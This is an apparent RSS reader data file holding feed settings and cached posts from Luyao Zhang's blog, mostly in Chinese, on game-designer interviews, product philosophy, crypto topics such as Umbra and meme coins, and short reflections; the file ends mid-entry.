{
  "feeds": [
    {
      "name": "zhangluyao",
      "url": "https://zhangluyao.com/index.xml",
      "folder": "log"
    },
    {
      "name": "coolshell",
      "url": "https://coolshell.cn/feed",
      "folder": "rip"
    },
    {
      "name": "zhangdinghao",
      "url": "https://zhangdinghao.cn/atom.xml",
      "folder": "society"
    },
    {
      "name": "jsomers",
      "url": "https://jsomers.net/blog/feed",
      "folder": "log"
    }
  ],
  "updateTime": 60,
  "filtered": [
    {
      "name": "Favorites",
      "read": true,
      "unread": true,
      "filterTags": [],
      "filterFolders": [],
      "filterFeeds": [],
      "ignoreTags": [],
      "ignoreFeeds": [],
      "ignoreFolders": [],
      "favorites": true,
      "sortOrder": "ALPHABET_NORMAL"
    }
  ],
  "saveLocation": "default",
  "displayStyle": "cards",
  "saveLocationFolder": "",
  "items": [
    {
      "title": "Luyao Zhang",
      "subtitle": "",
      "link": "https://zhangluyao.com/",
      "image": null,
      "description": "Recent content on Luyao Zhang",
      "items": [
        {
          "title": "看《Diablo》之父 David Brevik 访谈",
          "description": "<p>看完波斯王子的 <a href=\"https://zhangluyao.com/blog/prince_of_persia/\"  >访谈</a> 后，我又看了 Diablo 之父、北方暴雪的创始人 David Brevik 的 <a href=\"https://www.youtube.com/watch?v=huPF3Gid7DE\"   target=\"_blank\" >访谈</a>，也很有趣。</p>\n<p>也有两件事让我印象深刻。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>一个是他一直想做 Diablo，跟很多投资人和公司 pitch 过 Diablo 的想法，<strong>大家一听是个 RPG 游戏，都马上没兴趣了</strong>，因为当时所有人都认为，RPG 游戏已经衰落，以后人们不会玩 RPG 游戏了（1994 年）。</p>\n<p>这个事情让我很震撼，因为我们知道的几乎所有经典 RPG 游戏都是在那以后诞生的，而那会的人却认为 RPG 游戏已经到头了。如果他们可笑的话，那今天觉得某个游戏类型到头了的人们，也是同样可笑的（比如很多人都觉得 MMORPG 到头了）。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>另一个是从回合制到即时战斗的转变。</p>\n<p>当时北方暴雪在做 Diablo，南方暴雪在做魔兽争霸。南方因为一直做即时战略游戏，他们给北方暴雪的建议是把 Diablo 从回合制改成即时战斗，那样可能会更好玩。</p>\n<p>创造 Diablo 的这哥们就觉得很被冒犯，对他来说，回合制的紧张感是他做这个游戏的初心，这怎么能丢呢，搞成即时制后，乐趣不都没了吗。</p>\n<p>然而，他们团队内部搞了个投票，结果大部分人都支持改成即时制。他很无语，决定自己改个即时战斗版本出来，告诉大家这真的不好玩。</p>\n<p>于是他周五一个人留在办公室里加班改代码，很快就整了个 demo 出来，结果自己把自己震撼到了，点怪、砍怪、掉宝物，就这么简单的过程，他连续玩了一个小时，<strong>因为实在是太好玩了</strong>。</p>\n<p>等到大家周一上班的时候，他已经把整个游戏都改成即时战斗的了。</p>\n<p>这个事情有意思的地方在于，做出来体验它，要比想象中的感受更真实。即使你 100% 确定一个东西要这样，不要那样，那也不一定是你真实的感受。做出来，体验到，才是真实的。</p>\n",
          "content": "<p>看完波斯王子的 <a href=\"https://zhangluyao.com/blog/prince_of_persia/\"  >访谈</a> 后，我又看了 Diablo 之父、北方暴雪的创始人 David Brevik 的 <a href=\"https://www.youtube.com/watch?v=huPF3Gid7DE\"   target=\"_blank\" >访谈</a>，也很有趣。</p>\n<p>也有两件事让我印象深刻。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>一个是他一直想做 Diablo，跟很多投资人和公司 pitch 过 Diablo 的想法，<strong>大家一听是个 RPG 游戏，都马上没兴趣了</strong>，因为当时所有人都认为，RPG 游戏已经衰落，以后人们不会玩 RPG 游戏了（1994 年）。</p>\n<p>这个事情让我很震撼，因为我们知道的几乎所有经典 RPG 游戏都是在那以后诞生的，而那会的人却认为 RPG 游戏已经到头了。如果他们可笑的话，那今天觉得某个游戏类型到头了的人们，也是同样可笑的（比如很多人都觉得 MMORPG 到头了）。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>另一个是从回合制到即时战斗的转变。</p>\n<p>当时北方暴雪在做 Diablo，南方暴雪在做魔兽争霸。南方因为一直做即时战略游戏，他们给北方暴雪的建议是把 Diablo 从回合制改成即时战斗，那样可能会更好玩。</p>\n<p>创造 Diablo 的这哥们就觉得很被冒犯，对他来说，回合制的紧张感是他做这个游戏的初心，这怎么能丢呢，搞成即时制后，乐趣不都没了吗。</p>\n<p>然而，他们团队内部搞了个投票，结果大部分人都支持改成即时制。他很无语，决定自己改个即时战斗版本出来，告诉大家这真的不好玩。</p>\n<p>于是他周五一个人留在办公室里加班改代码，很快就整了个 demo 出来，结果自己把自己震撼到了，点怪、砍怪、掉宝物，就这么简单的过程，他连续玩了一个小时，<strong>因为实在是太好玩了</strong>。</p>\n<p>等到大家周一上班的时候，他已经把整个游戏都改成即时战斗的了。</p>\n<p>这个事情有意思的地方在于，做出来体验它，要比想象中的感受更真实。即使你 100% 确定一个东西要这样，不要那样，那也不一定是你真实的感受。做出来，体验到，才是真实的。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/diablo/",
          "creator": "Luyao",
          "pubDate": "Sat, 28 Oct 2023 02:59:56 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "ea5fde5aeda0aa6e80bd38136cf28cfe",
          "highlights": []
        },
        {
          "title": "看《波斯王子》之父 Jordan Mechner 访谈",
          "description": "<p>看了一个波斯王子的开发历程的 <a href=\"https://www.youtube.com/watch?v=sw0VfmXKq54\"   target=\"_blank\" >访谈</a>，很有趣。</p>\n<p>有几个事情让我印象深刻，</p>\n<p>一个是，他在开发过程中的情绪感受，我太有体会了，一会感觉这是杰作，一会又感觉这会是一坨屎，来回横跳；时不时遇到难题，觉得要过不去了…… 就是这种感觉。后来人们看到的波斯王子，那么丝滑和有趣，实际上克服了重重困难的做出来的。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>另一个是，波斯王子第一版是为 Apple II 开发的（他只有这个，是一台他表哥的机器），他做了两年时间，还没发布，自己已经急得不行了；但与此同时，Apple II 这个机器正在衰落，有各种新的、其他品牌的、性能更好的机器出现，他就有点痛苦，因为如果切换过去的话，会消耗更多时间，但继续在 Apple II 上做，可能到时候就没人玩了。</p>\n<p>最后他决定回归初心，他选择继续在 Apple II 上专心把最初想做的东西都做出来。</p>\n<p>后来发布后，确实因为平台过时，而销量一般，但因为游戏本身很精彩，它随后被移植到了各种平台上，包括各种游戏机和 PC 机，成为了经典 IP。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>还有一个是 Shadow Man 的设计，堪称经典。</p>\n<p>由于 Apple II 的内存只有 48KB，所有的动画、音效、游戏全部都要放进这一点点空间里，根本没有多余的地方来放敌人和战斗。</p>\n<p>最后他用了一个很巧妙的方法，创造了一个和主人公长得一样（这样比较省内存）、但是是黑色的人，叫 Shadow Man。</p>\n<p><strong>它是主人公照镜子时，从镜子里出来的。</strong></p>\n<p><strong>当你和他战斗时，每次攻击他，你自己都会掉血；</strong></p>\n<p><strong>而当你把剑收起来时，他也会把剑收起来；</strong></p>\n<p><strong>你走向他，他也会走你，你们合二为一，变成一个人，所有 Shadow Man 曾经从你这边偷走的生命值，都会在那一刻回来。</strong></p>\n<p><img src=\"https://zhangluyao.com/images/pince_of_persia/pince_of_persia.jpg\" alt=\"shadow man in Prince of Persia\"></p>\n",
          "content": "<p>看了一个波斯王子的开发历程的 <a href=\"https://www.youtube.com/watch?v=sw0VfmXKq54\"   target=\"_blank\" >访谈</a>，很有趣。</p>\n<p>有几个事情让我印象深刻，</p>\n<p>一个是，他在开发过程中的情绪感受，我太有体会了，一会感觉这是杰作，一会又感觉这会是一坨屎，来回横跳；时不时遇到难题，觉得要过不去了…… 就是这种感觉。后来人们看到的波斯王子，那么丝滑和有趣，实际上克服了重重困难的做出来的。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>另一个是，波斯王子第一版是为 Apple II 开发的（他只有这个，是一台他表哥的机器），他做了两年时间，还没发布，自己已经急得不行了；但与此同时，Apple II 这个机器正在衰落，有各种新的、其他品牌的、性能更好的机器出现，他就有点痛苦，因为如果切换过去的话，会消耗更多时间，但继续在 Apple II 上做，可能到时候就没人玩了。</p>\n<p>最后他决定回归初心，他选择继续在 Apple II 上专心把最初想做的东西都做出来。</p>\n<p>后来发布后，确实因为平台过时，而销量一般，但因为游戏本身很精彩，它随后被移植到了各种平台上，包括各种游戏机和 PC 机，成为了经典 IP。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>还有一个是 Shadow Man 的设计，堪称经典。</p>\n<p>由于 Apple II 的内存只有 48KB，所有的动画、音效、游戏全部都要放进这一点点空间里，根本没有多余的地方来放敌人和战斗。</p>\n<p>最后他用了一个很巧妙的方法，创造了一个和主人公长得一样（这样比较省内存）、但是是黑色的人，叫 Shadow Man。</p>\n<p><strong>它是主人公照镜子时，从镜子里出来的。</strong></p>\n<p><strong>当你和他战斗时，每次攻击他，你自己都会掉血；</strong></p>\n<p><strong>而当你把剑收起来时，他也会把剑收起来；</strong></p>\n<p><strong>你走向他，他也会走你，你们合二为一，变成一个人，所有 Shadow Man 曾经从你这边偷走的生命值，都会在那一刻回来。</strong></p>\n<p><img src=\"https://zhangluyao.com/images/pince_of_persia/pince_of_persia.jpg\" alt=\"shadow man in Prince of Persia\"></p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/prince_of_persia/",
          "creator": "Luyao",
          "pubDate": "Sat, 28 Oct 2023 02:54:46 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "409924534dbdc18c570125792be695fd",
          "highlights": []
        },
        {
          "title": "标题",
          "description": "<p>很久以前我把博客迁移到这，一个原因是之前那个太卡了，另一个原因是我不想写标题。</p>\n<p>标题是一种总结，它迫使你去理性思考，但这会打断你的感受。而且，有时我只想写一两句话（因为这就是想法的全部），这个时候再给它一个类似长度的标题，看起来会非常奇怪。</p>\n<p>Email 的标题也常让我觉得奇怪。古人写信是没有标题的，发明 Email 协议的那个人，somehow 觉得信件应该有个标题，于是 80 亿人每次写信时都要绞尽脑汁写一个标题。我觉得发明协议的那个人是有责任的。</p>\n<p>我甚至觉得，今天即时通讯的量远大于 Email，有一部分（可能是大部分）原因是 Email 要写那个操蛋的标题。</p>\n",
          "content": "<p>很久以前我把博客迁移到这，一个原因是之前那个太卡了，另一个原因是我不想写标题。</p>\n<p>标题是一种总结，它迫使你去理性思考，但这会打断你的感受。而且，有时我只想写一两句话（因为这就是想法的全部），这个时候再给它一个类似长度的标题，看起来会非常奇怪。</p>\n<p>Email 的标题也常让我觉得奇怪。古人写信是没有标题的，发明 Email 协议的那个人，somehow 觉得信件应该有个标题，于是 80 亿人每次写信时都要绞尽脑汁写一个标题。我觉得发明协议的那个人是有责任的。</p>\n<p>我甚至觉得，今天即时通讯的量远大于 Email，有一部分（可能是大部分）原因是 Email 要写那个操蛋的标题。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/title/",
          "creator": "Luyao",
          "pubDate": "Thu, 28 Sep 2023 11:57:14 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "290a04b6ecca23be0ebefe356190e894",
          "highlights": []
        },
        {
          "title": "It's okay to Make Something Nobody Wants",
          "description": "<p><img src=\"https://zhangluyao.com/images/selfish_creator/rick-rubin.jpeg\" alt=\"\"></p>\n<p>Products seem to be made for users, but I think this might be an illusion; they are more like a medium for self-expression.</p>\n<p>Different expressions, conceived by various minds, undergo a form of natural selection, with the surviving expression being the one that resonates most with users.</p>\n<p>I mean, the process unfolds like this: you create something not because &ldquo;I think they might need this,&rdquo; but because &ldquo;I find this so fucking interesting.&rdquo; Then, when others use your product, they feel the same emotions you did, and they say, &ldquo;I find this so fucking interesting.&rdquo;</p>\n<p>From this perspective, a product is like a container for emotions; the creator puts them in, duplicates it a thousand times, and users extract them from the product.</p>\n<p>You can&rsquo;t be devoid of emotion and expect users to experience emotion after using it.</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>I think it’s okay to make something that nobody wants. All you need to do is to make sure you&rsquo;ve fully expressed your emotions in this product.</p>\n<p>But in most cases, people care too much or think too much, and end up making something even they themselves don&rsquo;t like it.</p>\n<p>If everyone made things they really liked, we’d have a lot more cool stuff.</p>\n<p>This is tougher than it seems. Because if you have expectations, you get worried, stressed, and lose your feelings right away.</p>\n<p>In simpler terms, people can’t make something they don’t like and hope others will like it.</p>\n<p>Maybe that’s why a lot of cool stuff started as side projects. People don’t expect much from side projects; they do it more for fun or for themselves.</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>We humans are machines that only understand ourselves. The only way we could understand someone else is through ourselves. We really don’t get how a flower feels because it doesn’t have a brain or eyes, and we don’t have leaves.</p>\n<p>Given this, I don’t think any &ldquo;I don’t get it, but I know you need it, so I made it for you&rdquo; would actually work.</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>Later, when talking with my girlfriend about this, I suddenly understood Steve Jobs, and others like him, much more deeply.</p>\n<p>People often complained about Jobs: when his team showed him their work, he would say &ldquo;It doesn’t feel right,&rdquo; and when they asked how to fix it, he said &ldquo;I don’t know, make it better and show me again, and then I’ll know.&rdquo;</p>\n<p>This confused a lot of people. He found problems but didn’t know how to fix them or why they were problems.</p>\n<p>Now, I totally get where Jobs was coming from.</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>When we make something and want users to feel what we feel, we first have to feel it a lot ourselves. Jobs was this kind of “feeling detector,” and this is the real deal.</p>\n<p>I believe the real skill in making products isn&rsquo;t some &ldquo;making products&rdquo; skill, but rather a skill in feeling your own subtle emotions.</p>\n<p>Can others feel what Jobs felt? I think so. After the iPhone came out, everyone loved it, showing that they felt it.</p>\n<p>The only difference is that during the making of this emotional medium, Jobs could perceptively sense those subtle emotions, while most participants might not perceive their own emotions due to various reasons.</p>\n<p>This also explains why reducing expectations and bringing attention back to the present is crucial for making product. Because this helps you perceive those subtle emotions. If your mind is filled with external chaos, it would be harder to notice those emotions.</p>\n",
          "content": "<p><img src=\"https://zhangluyao.com/images/selfish_creator/rick-rubin.jpeg\" alt=\"\"></p>\n<p>Products seem to be made for users, but I think this might be an illusion; they are more like a medium for self-expression.</p>\n<p>Different expressions, conceived by various minds, undergo a form of natural selection, with the surviving expression being the one that resonates most with users.</p>\n<p>I mean, the process unfolds like this: you create something not because &ldquo;I think they might need this,&rdquo; but because &ldquo;I find this so fucking interesting.&rdquo; Then, when others use your product, they feel the same emotions you did, and they say, &ldquo;I find this so fucking interesting.&rdquo;</p>\n<p>From this perspective, a product is like a container for emotions; the creator puts them in, duplicates it a thousand times, and users extract them from the product.</p>\n<p>You can&rsquo;t be devoid of emotion and expect users to experience emotion after using it.</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>I think it’s okay to make something that nobody wants. All you need to do is to make sure you&rsquo;ve fully expressed your emotions in this product.</p>\n<p>But in most cases, people care too much or think too much, and end up making something even they themselves don&rsquo;t like it.</p>\n<p>If everyone made things they really liked, we’d have a lot more cool stuff.</p>\n<p>This is tougher than it seems. Because if you have expectations, you get worried, stressed, and lose your feelings right away.</p>\n<p>In simpler terms, people can’t make something they don’t like and hope others will like it.</p>\n<p>Maybe that’s why a lot of cool stuff started as side projects. People don’t expect much from side projects; they do it more for fun or for themselves.</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>We humans are machines that only understand ourselves. The only way we could understand someone else is through ourselves. We really don’t get how a flower feels because it doesn’t have a brain or eyes, and we don’t have leaves.</p>\n<p>Given this, I don’t think any &ldquo;I don’t get it, but I know you need it, so I made it for you&rdquo; would actually work.</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>Later, when talking with my girlfriend about this, I suddenly understood Steve Jobs, and others like him, much more deeply.</p>\n<p>People often complained about Jobs: when his team showed him their work, he would say &ldquo;It doesn’t feel right,&rdquo; and when they asked how to fix it, he said &ldquo;I don’t know, make it better and show me again, and then I’ll know.&rdquo;</p>\n<p>This confused a lot of people. He found problems but didn’t know how to fix them or why they were problems.</p>\n<p>Now, I totally get where Jobs was coming from.</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>When we make something and want users to feel what we feel, we first have to feel it a lot ourselves. Jobs was this kind of “feeling detector,” and this is the real deal.</p>\n<p>I believe the real skill in making products isn&rsquo;t some &ldquo;making products&rdquo; skill, but rather a skill in feeling your own subtle emotions.</p>\n<p>Can others feel what Jobs felt? I think so. After the iPhone came out, everyone loved it, showing that they felt it.</p>\n<p>The only difference is that during the making of this emotional medium, Jobs could perceptively sense those subtle emotions, while most participants might not perceive their own emotions due to various reasons.</p>\n<p>This also explains why reducing expectations and bringing attention back to the present is crucial for making product. Because this helps you perceive those subtle emotions. If your mind is filled with external chaos, it would be harder to notice those emotions.</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/make-something-nobody-wants/",
          "creator": "Luyao",
          "pubDate": "Thu, 21 Sep 2023 20:01:45 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "e18eda6e8819b59afce1b31885e332fe",
          "highlights": []
        },
        {
          "title": "Holy Fuck",
          "description": "<p>遛狗时，我忽然意识到，世界和我是对称的 —— 我就是世界的 “世界”。</p>\n<p>我就像是一台机器，世界就像是机器前面的操作员。</p>\n<p>他输入给我一些东西，然后我肚子里咕嘟咕嘟，吐回给她一些东西。</p>\n<p>他接收到这些东西后也进行了一番咕嘟咕嘟的思考，最后又变成我的输入…</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>随后意识到，从拓扑上讲，如果反过来，<strong>世界也可以看作是包在我里面的</strong>。</p>\n<p>所以理论上讲，世界和我肚子里的一个细菌，可能没有差别。</p>\n<p>因为如果你足够仔细地看那个细菌，它也可以像世界那么大那么复杂。</p>\n<p>如果粗略地看世界，它也可以像细菌那么小。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>Holy fuck!</p>\n<p>从这个角度来说，世界上所有东西都算是对称的。</p>\n<p>也就是说，</p>\n<p><strong>你沿着一条路往前走，走过各个景点，实际上就是成为一切</strong></p>\n<p>Oh my god&hellip;</p>\n",
          "content": "<p>遛狗时，我忽然意识到，世界和我是对称的 —— 我就是世界的 “世界”。</p>\n<p>我就像是一台机器，世界就像是机器前面的操作员。</p>\n<p>他输入给我一些东西，然后我肚子里咕嘟咕嘟，吐回给她一些东西。</p>\n<p>他接收到这些东西后也进行了一番咕嘟咕嘟的思考，最后又变成我的输入…</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>随后意识到，从拓扑上讲，如果反过来，<strong>世界也可以看作是包在我里面的</strong>。</p>\n<p>所以理论上讲，世界和我肚子里的一个细菌，可能没有差别。</p>\n<p>因为如果你足够仔细地看那个细菌，它也可以像世界那么大那么复杂。</p>\n<p>如果粗略地看世界，它也可以像细菌那么小。</p>\n<hr style=\"width: 100px; margin: 30px auto;\" />\n<p>Holy fuck!</p>\n<p>从这个角度来说，世界上所有东西都算是对称的。</p>\n<p>也就是说，</p>\n<p><strong>你沿着一条路往前走，走过各个景点，实际上就是成为一切</strong></p>\n<p>Oh my god&hellip;</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/world/",
          "creator": "Luyao",
          "pubDate": "Mon, 11 Sep 2023 22:50:07 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "0aeac4f6f2c722ea7406eb075fcaae10",
          "highlights": []
        },
        {
          "title": "Umbra",
          "description": "<p>前两天 ETHGlobal 的 hackathon 里，看到个项目蛮有意思的，叫 <a href=\"https://ethglobal.com/showcase/stealth-safes-n6aj5\"   target=\"_blank\" >StealthSafe</a>，是一个 Safe 的隐私转账协议，还拿了 safe 的奖。这个协议是基于 Safe 和 <a href=\"https://app.umbra.cash/faq#how-does-it-work\"   target=\"_blank\" >Umbra</a> 这俩协议做的，基本上就是个多签版的 Umbra。</p>\n<p>事实上这是我头一次听到 Umbra，看了一下，很有趣。</p>\n<p><img src=\"https://zhangluyao.com/images/stealthsafe_umbra/umbra.jpeg\" alt=\"\"></p>\n<p>Umbra 的原理很简单，就是<strong>每次别人给你转账时，它会帮你生成一个空地址，钱会进这个地址</strong>，这个地址只有你能控制（别人不知道）。然后你可以转入其他地方，比如交易所，这样别人就不知道去向了。</p>\n<p>这样可以做到一些很有意思的事情，比如你可以公布自己的地址，让大家转账给你，但人们既看不到究竟谁给你转了，也不知道你总共收了多少钱。</p>\n<p>虽然不是百分百彻底的隐私，但是原理非常简单，我感觉可以解决许多问题。</p>\n",
          "content": "<p>前两天 ETHGlobal 的 hackathon 里，看到个项目蛮有意思的，叫 <a href=\"https://ethglobal.com/showcase/stealth-safes-n6aj5\"   target=\"_blank\" >StealthSafe</a>，是一个 Safe 的隐私转账协议，还拿了 safe 的奖。这个协议是基于 Safe 和 <a href=\"https://app.umbra.cash/faq#how-does-it-work\"   target=\"_blank\" >Umbra</a> 这俩协议做的，基本上就是个多签版的 Umbra。</p>\n<p>事实上这是我头一次听到 Umbra，看了一下，很有趣。</p>\n<p><img src=\"https://zhangluyao.com/images/stealthsafe_umbra/umbra.jpeg\" alt=\"\"></p>\n<p>Umbra 的原理很简单，就是<strong>每次别人给你转账时，它会帮你生成一个空地址，钱会进这个地址</strong>，这个地址只有你能控制（别人不知道）。然后你可以转入其他地方，比如交易所，这样别人就不知道去向了。</p>\n<p>这样可以做到一些很有意思的事情，比如你可以公布自己的地址，让大家转账给你，但人们既看不到究竟谁给你转了，也不知道你总共收了多少钱。</p>\n<p>虽然不是百分百彻底的隐私，但是原理非常简单，我感觉可以解决许多问题。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/stealthsafe_umbra/",
          "creator": "Luyao",
          "pubDate": "Tue, 25 Jul 2023 11:31:35 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "13a3b5382b69921b2654ec8bec3d524a",
          "highlights": []
        },
        {
          "title": "第一个互联网应用",
          "description": "<p>刚才遛狗时听了一期 Paul Graham 的 <a href=\"https://pod.link/1677066062/episode/8d061197b65ea73dfee31672a733e1bc\"   target=\"_blank\" >podcast</a>，蛮有意思。</p>\n<p>在 90 年代时，PG 做了世界上第一个互联网应用 <a href=\"https://en.wikipedia.org/wiki/Viaweb\"   target=\"_blank\" >viaweb</a>。他说在那之前，人们对于通过浏览器上网的概念仅仅是 <strong>“看”</strong> 东西，直到有一天早上醒来，他突然有个想法：</p>\n<blockquote>\n<p>“有没有可能让用户通过浏览器控制我们的服务器，从而修改他们所看到的内容？”</p>\n</blockquote>\n<p>尽管如今我们早已习以为常地与网站互动，但在当时，这个想法听起来非常科幻。人们默认浏览器只是用来“看”东西的，为什么要让我去控制一台远程服务器呢？图啥呢？</p>\n<p>这也让我想到当下的区块链。做游戏的人对链上游戏兴奋不已，做社交的人对链上社交兴奋不已，做内容的人对链上内容兴奋不已，而其他围观群众只觉得这群人有毛病。我不止一次听到有人说：区块链就是用来做金融的，怎么总有傻逼想着用它做其他事情。</p>\n<p>觉得区块链只能做金融、现状很好、一切都已足够的人，和 30 年前觉得互联网只是用来“看”的人，其实是一样的。</p>\n<p>（BTW，或许这一点对于 builder 尤其重要。第一个发明互联网应用的人，他并不知道它可以干嘛，也不知道如何从中赚钱，只是觉得这么干好像有点意思。如果他很想很想赚钱，他可能就不干这事儿了。）</p>\n<p>首发于 <a href=\"https://crypto4.wtf/p/1fb\"   target=\"_blank\" >crypto4.wtf</a></p>\n",
          "content": "<p>刚才遛狗时听了一期 Paul Graham 的 <a href=\"https://pod.link/1677066062/episode/8d061197b65ea73dfee31672a733e1bc\"   target=\"_blank\" >podcast</a>，蛮有意思。</p>\n<p>在 90 年代时，PG 做了世界上第一个互联网应用 <a href=\"https://en.wikipedia.org/wiki/Viaweb\"   target=\"_blank\" >viaweb</a>。他说在那之前，人们对于通过浏览器上网的概念仅仅是 <strong>“看”</strong> 东西，直到有一天早上醒来，他突然有个想法：</p>\n<blockquote>\n<p>“有没有可能让用户通过浏览器控制我们的服务器，从而修改他们所看到的内容？”</p>\n</blockquote>\n<p>尽管如今我们早已习以为常地与网站互动，但在当时，这个想法听起来非常科幻。人们默认浏览器只是用来“看”东西的，为什么要让我去控制一台远程服务器呢？图啥呢？</p>\n<p>这也让我想到当下的区块链。做游戏的人对链上游戏兴奋不已，做社交的人对链上社交兴奋不已，做内容的人对链上内容兴奋不已，而其他围观群众只觉得这群人有毛病。我不止一次听到有人说：区块链就是用来做金融的，怎么总有傻逼想着用它做其他事情。</p>\n<p>觉得区块链只能做金融、现状很好、一切都已足够的人，和 30 年前觉得互联网只是用来“看”的人，其实是一样的。</p>\n<p>（BTW，或许这一点对于 builder 尤其重要。第一个发明互联网应用的人，他并不知道它可以干嘛，也不知道如何从中赚钱，只是觉得这么干好像有点意思。如果他很想很想赚钱，他可能就不干这事儿了。）</p>\n<p>首发于 <a href=\"https://crypto4.wtf/p/1fb\"   target=\"_blank\" >crypto4.wtf</a></p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/firstwebapp/",
          "creator": "Luyao",
          "pubDate": "Fri, 07 Jul 2023 23:20:50 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "b0f1074e3fe4cbf39baf48b8f8aac59d",
          "highlights": []
        },
        {
          "title": "理解 Meme Coin",
          "description": "<p>前阵子研究 meme 时，顺带研究了 meme coin。</p>\n<p>我惊讶地发现，这个领域是如此新，以至于连一篇系统性的文章都没有，许多人对它的理解都只停留在 meme 图的层面，但事实上，meme coin 和 meme 图基本无关。</p>\n<ul>\n<li>\n<p>DogeCoin 的 meme 不是 doge，而是 DogeCoin 被创造的故事（一个发币的玩笑）。</p>\n</li>\n<li>\n<p>ShibaInu 的 meme 不是 shiba inu，而是：1. DogeCoin 的暴涨故事 + 2. ShibaInu 和 Doge 都是狗头 + 3. 更新的代币发行方式</p>\n</li>\n<li>\n<p>Pepe 的 meme 不是 pepe，而是：1. DogeCoin 的暴涨故事 + 2. pepe 和 doge 都是 meme 图 + 3. 更新的代币发行方式</p>\n</li>\n</ul>\n<p>大家可能会说，这听起来很像某种“叙事”。我觉得没错，meme coin 和过往那些 DeFi、L2 之类的市场热点，本质上是一样的，<strong>都是围绕着某个广泛传播的故事的谢林点</strong> —— 项目本身多棒不重要，甚至于有没有项目都不重要，重要的是，我和别人选的一样就有奖励。</p>\n",
          "content": "<p>前阵子研究 meme 时，顺带研究了 meme coin。</p>\n<p>我惊讶地发现，这个领域是如此新，以至于连一篇系统性的文章都没有，许多人对它的理解都只停留在 meme 图的层面，但事实上，meme coin 和 meme 图基本无关。</p>\n<ul>\n<li>\n<p>DogeCoin 的 meme 不是 doge，而是 DogeCoin 被创造的故事（一个发币的玩笑）。</p>\n</li>\n<li>\n<p>ShibaInu 的 meme 不是 shiba inu，而是：1. DogeCoin 的暴涨故事 + 2. ShibaInu 和 Doge 都是狗头 + 3. 更新的代币发行方式</p>\n</li>\n<li>\n<p>Pepe 的 meme 不是 pepe，而是：1. DogeCoin 的暴涨故事 + 2. pepe 和 doge 都是 meme 图 + 3. 更新的代币发行方式</p>\n</li>\n</ul>\n<p>大家可能会说，这听起来很像某种“叙事”。我觉得没错，meme coin 和过往那些 DeFi、L2 之类的市场热点，本质上是一样的，<strong>都是围绕着某个广泛传播的故事的谢林点</strong> —— 项目本身多棒不重要，甚至于有没有项目都不重要，重要的是，我和别人选的一样就有奖励。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/memecoin/",
          "creator": "Luyao",
          "pubDate": "Sun, 21 May 2023 17:43:23 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "0a69502fbd48727a034cd2052e7a5057",
          "highlights": []
        },
        {
          "title": "观察即创造",
          "description": "<p>我忽然意识到，<strong>观察和创造没有本质区别</strong>，艺术家和工程师没有本质区别。</p>\n<p>每个人活在一个自己主观的世界里。</p>\n<p>艺术家说，我们可以从这个角度看世界，它是这样的。于是人们获得了一个新的世界。</p>\n<p>而工程师说，我觉得世界上可以有这样一个东西，我做出来了。于是人们获得了一个新的世界。</p>\n<p>它们本质是一样的。</p>\n",
          "content": "<p>我忽然意识到，<strong>观察和创造没有本质区别</strong>，艺术家和工程师没有本质区别。</p>\n<p>每个人活在一个自己主观的世界里。</p>\n<p>艺术家说，我们可以从这个角度看世界，它是这样的。于是人们获得了一个新的世界。</p>\n<p>而工程师说，我觉得世界上可以有这样一个东西，我做出来了。于是人们获得了一个新的世界。</p>\n<p>它们本质是一样的。</p>\n",
